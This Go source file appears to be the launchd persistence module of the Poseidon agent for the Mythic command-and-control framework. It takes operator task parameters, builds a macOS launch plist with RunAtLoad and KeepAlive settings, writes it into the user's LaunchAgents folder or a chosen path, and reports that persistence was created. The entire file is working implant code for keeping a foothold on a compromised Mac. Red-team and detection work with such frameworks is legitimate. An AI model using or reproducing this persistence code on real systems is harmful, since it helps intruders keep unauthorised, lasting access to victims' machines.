package persist_launchd

import (
	// Standard
	"bufio"
	"encoding/json"
	"fmt"
	"os"
	"os/user"

	// External
	"howett.net/plist"

	// Poseidon

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

type Arguments struct {
	Label       string   `json:"Label"`
	ProgramArgs []string `json:"args"`
	KeepAlive   bool     `json:"KeepAlive"`
	RunAtLoad   bool     `json:"RunAtLoad"`
	Path        string   `json:"LaunchPath"`
	LocalAgent  bool     `json:"LocalAgent"`
}

type launchPlist struct {
	Label            string   `plist:"Label"`
	ProgramArguments []string `plist:"ProgramArguments"`
	RunAtLoad        bool     `plist:"RunAtLoad"`
	KeepAlive        bool     `plist:"KeepAlive"`
}

func Run(task structs.Task) {
	msg := task.NewResponse()

	args := Arguments{}
	err := json.Unmarshal([]byte(task.Params), &args)

	if err != nil {
		msg.UserOutput = err.Error()
		msg.Completed = true
		msg.Status = "error"
		task.Job.SendResponses <- msg
		return
	}

	var argArray []string
	argArray = append(argArray, args.ProgramArgs...)

	data := &launchPlist{
		Label:            args.Label,
		ProgramArguments: argArray,
		RunAtLoad:        args.RunAtLoad,
		KeepAlive:        args.KeepAlive,
	}

	plist, err := plist.MarshalIndent(data, plist.XMLFormat, "\t")
	if err != nil {
		msg.UserOutput = err.Error()
		msg.Completed = true
		msg.Status = "error"
		task.Job.SendResponses <- msg
		return
	}

	if args.LocalAgent && len(args.Path) == 0 {
		usr, _ := user.Current()
		dir := usr.HomeDir

		args.Path = fmt.Sprintf("%s/Library/LaunchAgents/%s.plist", dir, args.Label)
	}

	f, err := os.Create(args.Path)
	if err != nil {
		msg.UserOutput = err.Error()
		msg.Completed = true
		msg.Status = "error"
		task.Job.SendResponses <- msg
		return
	}

	defer f.Close()

	w := bufio.NewWriter(f)
	_, err = w.WriteString(string(plist))

	if err != nil {
		msg.UserOutput = err.Error()
		msg.Completed = true
		msg.Status = "error"
		task.Job.SendResponses <- msg
		return
	}
	w.Flush()

	msg.Completed = true
	msg.UserOutput = "Launchd persistence created"
	task.Job.SendResponses <- msg
	return
}
